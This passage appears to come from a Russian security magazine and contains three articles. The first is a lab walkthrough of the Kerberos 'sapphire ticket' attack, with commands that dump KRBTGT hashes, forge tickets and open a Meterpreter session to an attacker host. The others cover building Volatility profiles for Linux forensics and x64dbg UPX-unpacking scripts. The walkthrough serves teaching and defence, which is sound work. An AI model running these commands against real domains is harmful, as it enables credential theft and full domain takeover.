между собой», — это фишка Kerberos, которая позволяет клиенту запросить
билет, зашифрованный сессией другого пользователя. Это обычно происхо‐
дит, когда сервером выступает юзер и у него нет долгосрочного ключа, как на
десктопе.
   Вот что нужно для запроса тикетов в U2U:
 • additional-tickets — содержит TGT пользователя, выступающего
   в роли сервера;
 • ENC-TKT-IN-SKEY — говорит KDC шифровать сервисный тикет с исполь‐
   зованием сессионного ключа из дополнительного тикета;
 • sname (имя сервиса) может указывать на пользовательский аккаунт, а не
   на традиционный сервис с SPN.

Это позволяет одному пользователю (пользователь Б) надежно аутентифици‐
роваться у другого пользователя (пользователь А), даже если у пользователя
А нет сохраненного секретного ключа.
   Пример работы U2U:
 • пользователь А (в роли сервера) выкатывает свой TGT пользователю Б;
 • пользователь Б отправляет KRB_TGS_REQ на KDC, включая TGT как от
   пользователя A, так и свой собственный;
 • KDC генерит новый сеансовый ключ и зашифровывает его два раза: пер‐
   вый раз — под сеансовый ключ пользователя A, второй — под ключ поль‐
   зователя Б.

Оба пользователя расшифровали свои части, и теперь у них есть общий сес‐
сионный ключ для безопасного общения.
   Это избавляет пользователя А от необходимости хранить постоянный мас‐
тер‑ключ, что делает запуск сервисов с менее защищенных конечных точек
вроде десктопов безопаснее.


ТЕХНИЧЕСКИЕ ПОДРОБНОСТИ

Sapphire Tickets использует связку S4U2Self и U2U, чтобы обойти классичес‐
кие требования к SPN.
   Вот как это работает. Обычно для S4U2Self требуется действительный
SPN. Но если подключить U2U, можно запросить тикеты S4U2Self вообще
без нужды в SPN.
   Предположим, у тебя есть сервис, настроенный для работы с Kerberos
Constrained Delegation (KCD). На него прилетает сессия от юзера, прошед‐
шего аутентификацию через NTLM. И тут загвоздка: если у юзера нет билета
Kerberos (ST), то этот сервис дальше делегировать права уже не сможет.
  В этом случае сервис отправляет запрос KRB_TGS_REQ , чтобы получить
сервис‑токен (ST) для пользователя — самому себе — через S4U2Self.
   Полученный тикет включает в себя PAC пользователя, который сервис
может расшифровать с помощью ключа KRBTGT.
   Как только у сервиса появится PAC (Privilege Attribute Certificate), он сможет
добавить его в уже имеющийся TGT (Ticket Granting Ticket), перешифровать
и снова подписать с использованием ключа KRBTGT.
   Коротко: S4U2Self позволяет сервису получить тикет от имени поль‐
зователя. U2U не требует ключа сервиса, чтобы это провернуть. Вместе они
превращаются в мощное  средство для  маскировки под  пользователей
и манипуляции токенами Kerberos.


Чем это отличается от алмазного билета?
В обеих атаках все крутится вокруг манипуляции с PAC настоящего TGT,
но разница в том, как именно это делается. В случае с алмазным билетом
атакующий модифицирует оригинальный PAC запрошенного TGT — либо
добавляет туда кучу дополнительных прав, либо вообще переписывает его
полностью. А вот с сапфировым билетом всё хитрее: тут злодей не просто
лезет в TGT, а добывает настоящий PAC высокопривилегированного поль‐
зователя через делегацию Kerberos и подкладывает его вместо исходного
PAC билета.



ПОДГОТОВКА ЛАБОРАТОРИИ

Чтобы провернуть эту атаку, мы создадим двух пользователей: admin1 —
доменный администратор, rudra — обычный пользователь на контроллере
домена. Залогинься на контроллере домена, открой командную строку и вво‐
ди команды по нашему рецепту.


net user rudra Password@1 /add /domain





Создаем нового  пользователя admin1 в домене и выдаем ему пароль
Password@1 . Затем добавляем пользователя admin1 в группу Domain Admins
в домене.


net user admin1 Password@1 /add /domain
net group "Domain Admins" admin1 /add /domain





После выполнения команды проверим, действительно ли admin1 прописан
в группе доменных админов. Для этого заходим в «Пользователи и компьюте‐
ры Active Directory → Пользователи» и дважды кликаем на выбранного поль‐
зователя (у нас это admin1). Затем переходим на вкладку «Членство». В спис‐
ке должен быть Domain Admins, как на скриншоте ниже.





АТАКА НА САПФИРОВЫЙ БИЛЕТ

Итак, чтобы  провести эту  атаку, злоумышленнику нужно заполучить хеш
KRBTGT. Представь себе такой расклад: хакер взломал учетные данные при‐
вилегированного аккаунта, скажем admin1-User. Получив доступ, он пытается
провернуть атаку DCSync для выкачки хеша KRBTGT аккаунта.


Извлечение хеша KRBTGT и SID домена
impacket-secretsdump 'ignite.local/admin1:Password@1@ignite.local -
just-dc-user krbtgt


             INFO

                        Impacket-secretsdump —  это  утилита,  которая
                          помогает  вытащить хеши  из  Active  Directory.
                   В нашем случае есть данные для входа от имени
                         админа и мы используем их, чтобы получить хеш
                       для   учетки  krbtgt,  которая   применяется
                       для управления билетами Kerberos.



nxc ldap 192.168.1.48 -u admin1 -p Password@1 --get-sid

На картинке ниже ты видишь хеши NTLM и AES для служебной учетки KRBTGT.





На следующем этапе извлеки SID для пользователя admin1.


nxc ldap 192.168.1.48 -u admin1 -p Password@1 --get-sid





Генерация поддельного TGS и PAC
Атакующий подделывает сервисный билет для пользователя admin1, воз‐
можно с завышенными привилегиями и валидной подписью, тем самым обхо‐
дя механизмы обнаружения типа PAC-проверки на контроллере домена.


impacket-ticketer -request -impersonate admin1 -domain ignite.local -
user rudra -password Password@1 -nthash
761688de884aff3372f8b9c53b2993c7 -aeskey
'8e52115cc36445bc520160f045033d5f40914ce1a6cf59c4c4bc96a51b970dbb' -
domain-sid S-1-5-21-798084426-3415456680-3274829403 baduser

Здесь
 • -domain ignite.local указывает целевой домен для атаки;
 • -user rudra — имя пользователя, для которого генерируется поддель‐
  ный билет;
 • -password Password@1 — пароль пользователя для получения крип‐
   тографических ключей при генерации PAC или билета. Обычно не встре‐
   чается в атаках с использованием Silver Ticket;
 • -nthash и -aesKey принадлежат аккаунту KRBTGT, как и нужно для атаки
   с использованием Diamond Ticket.

Следующие параметры нужны, чтобы криптографически подписывать и про‐
верять поддельные тикеты сервиса:
 • -domain-sid S-1-5-21-79...03 — эта строка описывает идентифика‐
   тор безопасности (SID) для домена (SID нужен, чтобы сформировать PAC);
 • admin1 — показывает, какой SPN (имя главного сервиса) или логин зло‐
   умышленник использует, чтобы притвориться другим и выкроить доступ
   к услугам как baduser .





Pass the Ticket
Эта переменная окружения указывает системе, какой именно файл кеша
учетных данных Kerberos ( baduser.ccache) применять для аутентификации.
  Файл baduser.ccache хранит билеты Kerberos для пользователя baduser ,
и, скорее всего, там окажется и сервисный билет (TGS) для выбранной цели.
Это значит, что ты можешь воспользоваться этим файлом, чтобы авторизо‐
ваться и зайти на сервис под видом baduser .


export KRB5CCNAME=baduser.ccache
impacket-psexec ignite.local/admin1@dc.ignite.local -dc-ip 192.168.1.
48 -target-ip 192.168.1.48 -k -no-pass

Давай разберем эту команду по частям:
 • impacket-psexec — утилита из библиотеки Impacket, с помощью SMB
   удаленно запускающая команды на виндовых машинах;
 • ignite.local/admin1@dc.ignite.local — основное имя Kerberos
    ( user@realm ), которое используется для аутентификации. Также здесь
  local — домен, admin1 — твой ник, local — имя хоста контроллера
   домена;
 • -dc-ip 192.168.1.48 — этот параметр задает IP-адрес нашего кон‐
   троллера домена;
 • -target-ip 192.168.1.48 — IP целевой системы, где будет выпол‐
   няться команда. В нашем случае он совпадает с IP контроллера домена;
 • -k означает, что вместо NTLM будет использоваться аутентификация
   через Kerberos. Наш инструмент подтянет Kerberos-билеты из указанного
  кеша учетных данных (KRB5CCNAME);
 • -no-pass — сообщает утилите не запрашивать пароль, потому что аутен‐
   тификация будет выполняться с помощью Kerberos-токенов из кеша.





METASPLOIT

Эта техника позволяет стянуть хеши SAM и секреты LSA (включая кеширован‐
ные креды) с удаленной машины на Windows без развертывания агента
на месте. Хитрость в том, чтобы удаленно обновить дескриптор безопасности
ключа реестра, воспользовавшись привилегиями WriteDACL локальных адми‐
нов, чтобы временно выставить права на чтение.
   Давай посмотрим, что нужно, чтобы это провернуть.


use gather/windows_secrets_dump
set RHOSTS 192.168.1.48
set SMBDOMAIN ignite.local
set SMBUSER admin1
set SMBPASS Password@1
set ACTION DOMAIN
set KRB_USERS KRBTGT
run


Атака с сапфировым билетом
Вот как выглядит процесс атаки.





Давай разберем, что происходит на этом скриншоте.
 • RHOSTS = 192.168.1.48 — целевая машина, домен‑контроллер;
 • SMBDOMAIN = ignite.local — домен;
 • SMBUSER = admin1 — юзер;
 • SMBPASS = Password@1 — пароль;
 • KRB_USERS = krbtgt — пользователь для выдачи билетов в Kerberos;
 • ACTION = DOMAIN — показывает, что происходит слив секретов домена.

Модуль запускается, и секреты сливаются с помощью метода DRSUAPI (он
часто используется для выделения данных из NTDS.DIT).
   Красным обведены:
 • NTLM-хеш для krbtgt: 76...c7 ;
 • ключ Kerberos AES для krbtgt: 8e...bb .

Эти данные необходимы для подделки билетов, потому что ключи KRBTGT
используются для подписи действительных билетов Kerberos.
   Этот модуль умело кует Kerberos-билеты, применяя четыре хитрых метода.
В методе «серебряный билет» атакующий берет хеш учетной записи сервиса
и клепает билет, который выдает себя за любого пользователя и дает этому
аккаунту нужные привилегии.
   Метод «золотой билет» — это когда злоумышленник использует хеш
krbtgt, чтобы смастерить билет, изображая любого пользователя с любыми
привилегиями.
   Далее идет «алмазный билет»: тут добавляется аутентификация на кон‐
троллере домена и затем применяется тот же хеш krbtgt, чтобы скопировать
PAC аутентифицированного пользователя в поддельный билет.
  И закрывает всю эту эпопею «сапфировый билет», где используют уловку
S4U2Self и U2U, чтобы добыть PAC другого пользователя, а затем на базе
хеша krbtgt создается поддельный билет.
  Мы используем модуль Metasploit forge_ticket, чтобы создать поддель‐
ный билет Kerberos.


Основные шаги
Сначала настраиваем параметры для подделки:
 • AES_KEY = ключ — берем его из предыдущего шага;
 • USER = admin1 — пользователь, которого мы изображаем;
 • REQUEST_USER = rudra — пользователь, создающий обращение;
 • REQUEST_PASSWORD = Password@1 — используется в процессе U2U;
 • DOMAIN = ignite.local — устанавливаем домен;
 • RHOSTS = 192.168.1.48 — целевая машина.

Затем запускаем модуль и получаем в виде ответа TGT (Ticket Granting Ticket)
и TGS (Ticket Granting Service).





Билет сохранен по следующему пути:


/root/.msf4/loot/20250128100342_default_192.168.1.48_mit.kerberos.
cca_038047.bin


use admin/kerberos/forge_ticket
set action FORGE_SAPPHIRE
set AES_KEY
8e52115cc36445bc520160f045033d5f40914ce1a6cf59c4c4bc96a51b970dbb
set USER admin1
set DOMAIN ignite.local
set REQUEST_USER rudra
set REQUEST_PASSWORD Password@1
set RHOSTS 192.168.1.48
run

Запускаем команду ls , чтобы показать все файлы. Затем используем mv , что‐
бы переименовать файл в 1.bin, — так будет проще ориентироваться
в будущем.





Следующий модуль использует валидные админские логин и пароль (или их
хеш), чтобы выполнить произвольный пейлоад. В общем, он чем‑то похож
на утилиту psexec из SysInternals. Модуль хорош тем, что умеет убирать
за собой. А еще он создает сервис с рандомно выбранными именем и опи‐
санием.
   Настройки:
 • SET RHOST 192.168.1.48 — IP целевой машины;
 • SMBDOMAIN: ignite.local — имя домена SMB-сети;
 • USERNAME: admin1 ;
 • SMB::AUTH: — установи как Kerberos;
 • SMB::KRB5CCNAME — кеш билетов Kerberos загружен из /root/.msf4/
  loot/1.bin ;
 • SMB::RHOSTNAME:dc.ignite.local — имя хоста контроллера домена;
 • DOMAINCONTOLLERHOST явно задан как 192.168.1.48;
 • LHOST — машина атакующего, 192.168.1.60.

Теперь введи run и жми Enter, чтобы запустить нагрузку и открыть сеанс
Meterpreter.


use exploit/windows/smb/psexec
set RHOSTS 192.168.1.48
set SMBDOMAIN ignite.local
set USERNAME admin1
set SMB::AUTH kerberos
set SMB::KRB5CCNAME /root/.msf4/loot/1.bin
set SMB::RHOSTNAME dc.ignite.local
set DOMAINCONTROLLERRHOST 192.168.1.48
set LHOST 192.168.1.60





ВЫВОДЫ

Сапфировый билет — это мощный способ манипуляции аутентификацией
Kerberos, объединяющий расширения протоколов S4U2Self и User-to-User
(U2U). Эта техника позволяет злоумышленнику или сервису выдать себя
за пользователя и вытащить его данные авторизации (PAC), не заморачива‐
ясь с Service Principal Name (SPN) или долгосрочным ключом сервиса.
   Как только злоумышленник получит PAC, он может внедрить его в поддель‐
ный билет. Автоматически открывается возможность повысить привилегии
или свободно перемещаться по домену.
   Эта техника наглядно демонстрирует, как злоумышленники могут исполь‐
зовать законные функции Kerberos — изначально созданные для гибкой
делегации и безопасной аутентификации между узлами, если в безопасности
домена есть пробелы в конфигурации и контроле.
   Чтобы предотвратить такие атаки:
 • мониторь активность заявок и нестандартных запросов на делегирование;
 • обрати внимание на защиту и аудит настроек KCD;
 • минимизируй использование NTLM и следи за хорошей гигиеной сер‐
   висных принципалов.

Сапфировые билеты превращают механизм доверия Kerberos в потенциаль‐
ный инструмент для незаметных атак. Поэтому осведомленность и умение
выявлять такие угрозы становятся жизненно важными навыками при защите
Active Directory.
ВЗЛОМ





Инструмент Volatility давно стал стандартом
в  цифровой   криминалистике,  но  его
эффективность напрямую зависит от кор‐
ректного профиля операционной системы,
который выступает «переводчиком» между                threatd3f0x0hunter,
сырыми  данными  памяти  и  понятной              threat researcher
человеку информацией. В этой статье мы
создадим  такой  профиль  для  работы
в Linux.


В современной цифровой криминалистике анализ оперативной памяти —
это ключевой этап расследования инцидентов. Он позволяет обнаружить сле‐
ды вредоносного ПО, извлечь пароли,  восстановить скрытые процессы
и даже  реконструировать  действия  злоумышленника.  Как  раз  с этим
и помогает Volatility.
   Если для Windows готовые профили для Volatility доступны «из коробки», то
в Linux всё иначе. Каждый дистрибутив и версия ядра требуют создания уни‐
кального профиля, что часто становится камнем преткновения для новичков.
Без этого шага Volatility просто не сможет интерпретировать структуры данных
в дампе памяти, что делает анализ невозможным.
  Для начала разберем, как создать дамп оперативной памяти в Linux.


СБОР ДАМПА ПАМЯТИ В LINUX

Перед тем как приступить к созданию профилей для Volatility, важно освоить
техники сбора дампов оперативной памяти в Linux. Это можно сделать
с помощью разных инструментов, таких как LiME (Linux Memory Extractor)
и AVML (Acquire Volatile Memory for Linux).
   Пример использования LiME :


insmod lime.ko "path=/tmp/memory_dump.lime format=lime"

После выполнения этой команды дамп памяти будет сохранен в файл /tmp/
memory_dump.lime .
   Второй популярный инструмент для сбора данных из оперативной памяти
Linux-систем — AVML , написанный на  языке  Rust. AVML предназначен
для работы в пользовательском пространстве (userland) и может быть раз‐
вернут как статический бинарный файл.
   Этот инструмент позволяет собирать данные из памяти без предваритель‐
ного знания о дистрибутиве и версии ядра, что делает его универсальным
и удобным для использования в разных сценариях, таких как анализ сбоев
системы или цифровая криминалистика.
  AVML использует несколько источников для сбора данных из памяти, вклю‐
чая:
 • /dev/crash — предоставляет доступ к физической памяти с вырав‐
   ниванием по страницам;
 • /proc/kcore — виртуальный дамп памяти ядра в формате ELF;
 • /dev/mem — доступ к физической памяти (в режиме только для чтения).

Следующая команда создаст файл с дампом оперативной памяти системы:


sudo ./avml memory.raw

К сожалению, может быть так, что тебе дали дамп на анализ, но без указания
версии ядра и компилятора.
  Для получения этой информации можешь выполнить команду


sudo strings ~/kali.avml | grep -i "Linux version"

Для Volatility 3 есть встроенный плагин banners, который выполняет такой же
поиск, только с использованием регулярного выражения:


sudo python3 volatility3/vol.py --clear-cache -f ~/kali.avml banners





                  Пример выполнения плагина banners

Для проверки работоспособности плагина выполним команду uname  -a
и получим версию ядра.



                     Пример выполнения uname -a

Теперь перейдем к созданию профиля.


СОЗДАЕМ ПРОФИЛЬ ДЛЯ VOLATILITY 2

Volatility 2 — это мощный инструмент для анализа дампов памяти, но для
работы с Linux-системами ему требуется специальный профиль, который
содержит информацию о структуре ядра и других важных данных.
   Профиль для Volatility 2 — это набор файлов, где хранится информация
о структуре ядра операционной системы, что необходимо для корректного
анализа дампа памяти. Профиль позволяет Volatility интерпретировать дан‐
ные, находящиеся в дампе RAM, такие как процессы, сетевые соединения,
открытые файлы и другие артефакты.
   Давай пройдемся по компонентам профиля Volatility 2.


DWARF-файл
Это файл, содержащий отладочную информацию о ядре Linux. Он создается
с помощью утилиты dwarfdump и включает в себя данные о структурах ядра,
их размерах и смещениях.


        WWW

                          Почитать о  формате  файла  можно  на  сайте
                          dwarfstd.org .



.debug_info


<0><0x0+0xc><DW_TAG_compile_unit> DW_AT_producer<GNU C11 14.2.1
20240912 (Red Hat 14.2.1-3) -mno-sse -mno-mmx -mno-sse2 -mno-3dnow -
mno-avx -m64 -mno-80387 -mno-fp-ret-in-387 -mpreferred-stack-
boundary=3 -mskip-rax-setup -mtune=generic -mno-red-zone -
mcmodel=kernel -mindirect-branch=thunk-extern -mindirect-branch-
register -mindirect-branch-cs-prefix -mfunction-return=thunk-extern -
mharden-sls=all -mrecord-mcount -mfentry -march=x86-64 -g -O2 -
std=gnu11 -p -fshort-wchar -funsigned-char -fno-common -fno-PIE -fno-
strict-aliasing -fcf-protection=branch -falign-jumps=1 -falign-
loops=1 -fno-asynchronous-unwind-tables -fno-jump-tables -fpatchable-
function-entry=16,16 -fno-delete-null-pointer-checks -fno-allow-
store-data-races -fstack-protector-strong -ftrivial-auto-var-
init=zero -fno-stack-clash-protection -fmin-function-alignment=16 -
fstrict-flex-arrays=3 -fno-strict-overflow -fstack-check=no -
fconserve-stack -fsanitize=bounds-strict -fsanitize=shift> DW_AT_
language<DW_LANG_C11> DW_AT_name</home/qwer/volatility/tools/linux/
module.c> DW_AT_comp_dir</usr/src/kernels/6.12.11-100.fc40.x86_64>
DW_AT_stmt_list<0x00000000>


System.map
Это файл, который содержит отладочную информацию о ядре, включая адре‐
са функций и переменных. System.map обычно находится в /boot/System.
map-$(uname -r).
   Пример файла System.map:


0000000000000000 D __per_cpu_start
0000000000000000 D fixed_percpu_data
0000000000001000 D cpu_debug_store
0000000000002000 D irq_stack_backing_store
0000000000006000 D cpu_tss_rw
000000000000b000 D gdt_page
000000000000c000 d exception_stacks
0000000000018000 d entry_stack_storage
0000000000019000 D espfix_waddr


Структура профиля
Профиль Volatility 2 — это ZIP-архив с двумя файлами, которые мы рассмат‐
ривали выше:


my_profile.zip
├── module.dwarf
└── System.map


Собираем профиль вручную
Разберем, что нужно сделать, чтобы создать такой профиль.
   Первым делом установи зависимости. В разных дистрибутивах это может
выглядеть по‑разному, вот пример для Ubuntu:


apt update && apt install -y linux-image-5.4.0-166-generic linux-
headers-5.4.0-166-generic build-essential dwarfdump make gcc zip

Теперь создаем DWARF-файл, точнее, скачиваем с GitHub:


git clone https://github.com/volatilityfoundation/volatility.git
cd volatility/tools/linux

Если установлено несколько ядер, можем поправить Makefile, чтобы указать,
какое ядро использовать:


sed -i 's/$(shell uname -r)/5.4.0-166-generic/g' Makefile

Либо можем запустить make, задав нужные аргументы:


make -C /lib/modules/$(uname -r)/build/ CONFIG_DEBUG_INFO= y M=$PWD
modules

Создадим профиль:


zip LinuxDebian_5_10_0-23-amd64_profilex64 /path/to/output.dwarf /
path/to/system.map

Добавляем профиль в Volatility. Скопируем созданный профиль в директорию
volatility/plugins/overlays/linux/.
  И проверим, что Volatility распознает профиль:


python2.7 vol.py --info | grep Linux





                         Проверка профиля Volatility 2

Теперь  Volatility сможет использовать этот профиль для анализа дампов
памяти. Просто указывай его в параметре --profile:


vol.py -f /path/to/memory_dump.raw --profile=LinuxDebian_5_10_0-23-
amd64_profilex64 linux_pslist


Собираем профиль при помощи Docker
Как вариант, можно сэкономить себе немного усилий и использовать Docker.
Вся сложность сборки — найти точное совпадение анализируемого ядра
и собрать точно такое же.
   Воспользуемся образом Docker для Ubuntu 20.04:


sudo docker run -it --rm -v $PWD:/volatility ubuntu:20.04 /bin/bash

Внутри контейнера мы устанавливаем нужную версию ядра и заголовков,
а  также набор  инструментов для сборки и  утилиту dwarfdump, которая
понадобится для анализа отладочной информации.
   Затем переходим в директорию с  инструментами  Volatility и правим
Makefile, чтобы явно указать версию ядра, которую мы собираемся исполь‐
зовать (по умолчанию он берет текущую, но в контейнере она может не сов‐
падать).
   Команда make запускает сборку модуля и генерацию DWARF-файла,
содержащего отладочные данные.
   Наконец, мы  упаковываем  результат —  .dwarf  и  соответствующий
System.map — в архив ubuntu20.04.zip, который и будет нашим готовым про‐
филем для Volatility.


apt update && apt install -y linux-image-5.4.0-166-generic linux-
headers-5.4.0-166-generic build-essential dwarfdump make gcc zip
cd volatility/tools/linux
sed -i 's/$(shell uname -r)/5.4.0-166-generic/g' Makefile
make
zip ubuntu20.04.zip module.dwarf /boot/System.map-5.4.0-166-generic

Использование Docker для создания профиля менее затратно по ресурсам
и времени.


СОЗДАНИЕ ПРОФИЛЯ ДЛЯ VOLATILITY 3

Volatility 3 — новая версия инструмента для анализа дампов памяти, постро‐
енная на более гибкой  архитектуре. В отличие от предыдущей версии,
Volatility 3 не требует создания отдельных профилей для каждого ядра. Вмес‐
то этого она использует таблицы символов (symbol tables). Для Windows такие
таблицы загружаются автоматически, а для Mac и Linux их, как и в Volatility 2,
нужно создавать вручную с помощью утилиты dwarf2json.


Вручную
Ставим Volatility 3:


git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
python3 -m pip install -r requirements.txt

Клонируем репозиторий dwarf2json и соберем его. Он позволит получить
файл JSON из ELF:


git clone https://github.com/volatilityfoundation/dwarf2json
cd dwarf2json/
go build
./dwarf2json linux

Нам необходимы символы отладки для ядра, которое будем анализировать.


dpkg -i /volatility/linux-image-5.4.0-166-lowlatency-dbgsym_5.4.0-
166_amd64.ddeb

Запустим  dwarf2json  для  генерации  таблицы  символов.  Помнишь,
для Volatility 2 мы уже делали DWARF-файл?


/volatility/dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.4.0-
166-lowlatency > linux-image-5.4.0-166-lowlatency-amd64.json

Скопируй полученный файл в директорию symbols Volatility 3:


cp linux-image-5.4.0-166-lowlatency-amd64.json <volatility3>/symbols/


При помощи Docker
Процесс создания в Docker такой же, как и для Volatility 2.
   Поднимаем образ для Ubuntu 20.04:


sudo docker run -it --rm -v $PWD:/volatility ubuntu:20.04 /bin/bash

И производим все остальные манипуляции:


# Установим зависимости
apt update && apt install -y linux-image-5.4.0-166-generic linux-
headers-5.4.0-166-generic build-essential dwarfdump make gcc zip


# Установим зависимости для Volatility 3
python3 -m pip install -r requirements.txt


# Клонируем и сбилдим dwarf2json
git clone https://github.com/volatilityfoundation/dwarf2json
cd dwarf2json/
go build
./dwarf2json linux


dpkg -i /volatility/linux-image-5.4.0-166-lowlatency-dbgsym_5.4.0-
166_amd64.ddeb


./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.4.0-166-
lowlatency > linux-image-5.4.0-166-lowlatency-amd64.json


ЗАКЛЮЧЕНИЕ

Создание профилей для Volatility — это важный этап в анализе дампов памяти
Linux-систем. Независимо от используемой версии инструмента понимание
процесса создания и использования профилей поможет тебе эффективно
подготовиться  к  анализу  дистрибутивов, которые  используются в  твоей
инфраструктуре.
   Распространенные ошибки при создании профилей:
 • использование vmlinuz вместо vmlinux ;
 • несовпадение версии ядра из дампа и созданного модуля.

В работе можно использовать репозитории для  Volatility 3 и  Volatility 2 ,
в которых есть много профилей и таблиц символов для Volatility 2 и 3.
ВЗЛОМ





Автоматизация x64dbg позволит создавать
собственные  инструменты  для  типовых
задач отладки, таких как распаковка фай‐
лов, поиск сигнатур, перехват или подмена
на лету результатов работы функций и даже          mr.grogrig@gmail.commr.grogrig
фаззинг в оперативной памяти! Давай пос‐
мотрим, какие есть способы сделать это и
как ими пользоваться.


ВСТРОЕННЫЙ ИНТЕРПРЕТАТОР

Для быстрого решения повседневных задач в отладчик встроен простой
скриптовый язык. Давай рассмотрим скрипт на нем, который будет рас‐
паковывать файл, накрытый UPX — самым распространенным упаковщиком.


//start
msg "upx (3.91) unpacker"
msg "make sure you're at the entry point of the program before you
continue"
pause


//clear breakpoints
bc
bphwc


//script start
step
bphws csp,r
erun
bphwc


//find oep jump
find cip,"80E9" //some pattern
cmp $result,0
je error


//go to OEP
bp $result+1
erun
bc
sti


//finish script
ret


error:
msg "didn't find oep jump"
ret

Синтаксис говорит сам за себя: имя команды, за которым следует разделя‐
емый запятыми набор аргументов. Комментарий идет после двух слешей.
Строчки обрамляются двойными кавычками. Цифровые константы интерпре‐
тируются как шестнадцатеричные числа, то есть число 100 на самом деле
значит 256.
   Одна и та же команда может иметь несколько имен, в длинной и короткой
форме. Например, команда SetBPX, устанавливающая точку останова, может
быть записана как bp . Короткая запись удобна для управления отладчиком
из встроенной консоли, расположенной снизу.





                               Результат команды msg

Готовый скрипт можно  загрузить из  текстового  файла, а затем отдать
на исполнение или запустить пошаговую отладку  скрипта, нажимая Tab
для перехода на следующую строку.





                    Исполняем по одной команде за раз

Разберем, что делает скрипт, переписав команды в длинной форме:


pause


//clear breakpoints
DeleteBPX
DeleteHardwareBreakpoint


//script start
StepOver
SetHardwareBreakpoint csp,r
erun
DeleteHardwareBreakpoint


//find oep jump
find cip,"80E9" //some pattern
cmp $result,0
je error


//go to OEP
SetBPX $result+1
erun
DeleteBPX
StepInto


//finish script
ret


error:
msg "didn't find oep jump"
ret


        WWW

                          Документация с полным описанием всех команд



Первая команда — pause — останавливает выполнение скрипта, после чего
его необходимо запустить вручную, исполнение продолжится со следующей
команды. Это удобно, когда от пользователя требуется выполнять действие,
например ставить EIP на точку входа.
   Далее  DeleteBPX   удаляет   все   программные   точки   останова,
а DeleteHardwareBreakpoint очищает отладочные регистры процессора.
Строка StepOver говорит отладчику сделать один шаг в пошаговом режиме,
то есть перейти в коде на следующую ассемблерную инструкцию, не заходя
в CALL , а перепрыгивая на следующую за ним команду.
   SetHardwareBreakpoint устанавливает хардварную точку останова. У нее
один обязательный и два опциональных аргумента: адрес, на который уста‐
навливается брейк‑пойнт, тип точки останова и размер «триггерной» области
в байтах. Первым аргументом передается регистр CSP, это особый виртуаль‐
ный регистр, который на x32 будет прочитан как ESP, а на x64 как RSP. Второй
аргумент r обозначает тип readwrite, то есть отладочное прерывание сра‐
ботает, когда байт по указанному адресу будет записан или прочитан.
   Строка erun отпускает поток исполнения, ровно до того момента, как сра‐
ботает любая точка останова. После чего через DeleteHardwareBreakpoint
удаляются все хардварные  точки останова. Регистр EIP в этот момент
находится на первой инструкции, которая меняет байт на вершине стека.
В момент исполнения скрипта это будет конец распаковки.
   Инструкция find ищет шаблон на указанной странице памяти. Первый
аргумент — адрес, с которого начинается поиск. Он берется из регистра CIP,
то есть EIP в нашем файле x32. Вторым аргументом указан шаблон 80E9 ,
это обычная подстрока. Команда поддерживает маски (whildcard), поэтому
можно указывать неизвестную часть шаблона через вопросительные знаки,
например EB0?90??8D .
    Результат, то есть найденный адрес вхождения, помещается в глобальную
переменную $result . Следующая команда, cmp (сокращение от compare),
использует его для сравнения с константой 0 , которая будет возвращена
в find , если вхождения не найдено. Логика работы cmp повторяет версию
для  x86:  результат  сравнения  записывается в  глобальные переменные
$_EZ_FLAG и $_BS_FLAG, это аналог флагов из процессорного регистра
EFLAGS.





                        Окно со всеми переменными

Управление  внутри  скрипта передается через команду je (сокращение
от Jump  if Equal). В данном случае скрипт передаст управление на метку
error , если вхождение подстроки 80E9 не было найдено.
   Дальше SetBPX  устанавливает софтверную  точку останова по адресу
$result+1. Скрипты поддерживают  выражения с множеством операций
над переменными. К найденному адресу прибавляется единица, это адрес
команды JMP OEP, которая передает управление на оригинальную точку входа
(original entry point) сразу после распаковки файла. Следом идут знакомые
нам erun и DeleteBPX.
   Последняя значимая команда — StepInto , она просит сделать один шаг
в пошаговом режиме. То есть исполнить найденную инструкцию JMP OEP,
передав управление на первую инструкцию распакованного файла. После
чего на команде ret исполнение скрипта завершается.


История вопроса
Не могу не отметить, что идея подобных скриптов принадлежит старинному
плагину для OllyDbg под названием OllyScript . Отладчик x64dbg — духовный
наследник «Ольги» и взял лучшие практики от своего предка. Так выглядит
скрипт под OllyScript для распаковки UPX:


var hwdBP
var softBP
sti
findop eip, #61#
mov hwdBP, $RESULT
bphws hwdBP, "x"
run
findop eip, #E9????????#
mov softBP, $RESULT
bp softBP
run
sti
cmt eip, "<<>>"
msg "OEP found, you can dump the file starting from this address"
ret

Как говорится, найди десять отличий.


ПЛАГИНЫ

Еще  один  способ  автоматизировать  отладку —  написание  плагинов
для x64dbg. Плагин — это обычный DLL-файл, собранный с инклудами
из Plugin SDK. При загрузке плагина отладчик ищет в экспорте DLL-функции
pluginit и plugsetup, которые сообщают информацию о плагине и регис‐
трируют новые команды.
   Plugin SDK идет в комплекте при скачивании актуального релиза отладчи‐
ка. Он представляет собой набор заголовочных и бинарных файлов, которые
сообщают компилятору, какие функции можно вызывать из внешнего модуля.
  Все новые  функции  определены  в  подключаемых  файлах. Для  них
не существует нормальной документации, но все должно быть понятно из тек‐
ста заголовочных файлов. Например, \pluginsdk\_scriptapi_debug.h :


namespace Script
{
    namespace Debug
    {
        SCRIPT_EXPORT void Wait();
        SCRIPT_EXPORT void Run();
        SCRIPT_EXPORT void Pause();
        SCRIPT_EXPORT void Stop();
        SCRIPT_EXPORT void StepIn();
        SCRIPT_EXPORT void StepOver();
        SCRIPT_EXPORT void StepOut();
        SCRIPT_EXPORT bool SetBreakpoint(duint address);
        // (...)
    };
};

Имена функций говорят сами за себя. Из‑за вложенных неймспейсов вызов
функций выглядит как Script::Debug::Wait() . Это сделано из‑за того, что
имена могут повторяться в разных контекстах.
  Я решил не заморачиваться с настройкой проекта и просто скачал плагин,
готовый к сборке. Он без проблем собирается в Visual Studio при условии, что
в системе установлен Windows SDK и нужный компилятор. Осталось заменить
пару функций, и новый плагин готов:


#include "pluginsdk/_scriptapi_debug.h"
#include "pluginsdk/_scriptapi_memory.h"
#include "pluginsdk/_scriptapi_register.h"
#include "pluginsdk/_scriptapi_pattern.h"
#include "pluginsdk/_scriptapi_comment.h"
#include "pluginsdk/_scriptapi_gui.h"
#include "pluginsdk/bridgemain.h"


#define PLUGIN_NAME "unpack_upx"


bool pluginInit(PLUG_INITSTRUCT* initStruct)
{
    if(!_plugin_registercommand(pluginHandle, PLUGIN_NAME, cbCommand,
false))
        _plugin_logputs("[" PLUGIN_NAME "] Error registering the ""
PLUGIN_NAME "" command!");
    return true;
}


static bool cbCommand(int argc, char* argv[])
